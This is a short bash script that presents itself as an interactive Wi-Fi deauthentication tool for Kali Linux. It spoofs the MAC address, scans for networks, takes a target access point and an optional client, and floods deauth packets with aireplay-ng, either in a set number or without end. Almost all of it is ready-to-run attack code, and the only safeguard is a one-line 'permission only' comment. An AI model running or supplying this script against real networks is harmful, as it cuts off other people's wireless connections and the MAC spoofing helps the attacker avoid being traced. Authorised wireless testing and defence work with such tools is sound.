#!/bin/bash

# Deauth Tool for Kali Linux (Enhanced Interactive Version)
# USE ONLY ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST

iface="wlan0"
mon_iface="${iface}mon"

echo "[*] Starting monitor mode on $iface..."
sudo airmon-ng start $iface

echo "[*] Spoofing MAC address..."
sudo ifconfig $mon_iface down
sudo macchanger -r $mon_iface
sudo ifconfig $mon_iface up

echo "[*] Scanning for networks (Press Ctrl+C to stop)..."
sleep 2
sudo airodump-ng $mon_iface

read -p "Enter the BSSID of the target: " bssid
read -p "Enter the Channel (CH) of the target: " channel
read -p "Enter Client MAC (optional - leave blank to target all clients): " client_mac

echo
echo "Deauth Options:"
echo "1) Send a specific number of deauth packets"
echo "2) Infinite deauth (until you press Ctrl+C)"
read -p "Choose option [1 or 2]: " deauth_mode

if [ "$deauth_mode" == "1" ]; then
    read -p "Enter number of deauth packets to send: " count
elif [ "$deauth_mode" == "2" ]; then
    count=0
else
    echo "[!] Invalid selection. Exiting."
    exit 1
fi

echo "[*] Locking onto target network..."
sudo airodump-ng --bssid $bssid -c $channel $mon_iface &
airodump_pid=$!
sleep 5
kill $airodump_pid

echo "[*] Launching deauth attack..."

if [ -z "$client_mac" ]; then
    sudo aireplay-ng --deauth $count -a $bssid $mon_iface
else
    sudo aireplay-ng --deauth $count -a $bssid -c $client_mac $mon_iface
fi

echo
read -p "Press Enter to restore managed mode..."

echo "[*] Stopping monitor mode and restoring Wi-Fi..."
sudo airmon-ng stop $mon_iface

echo "[+] Done. You're back online."

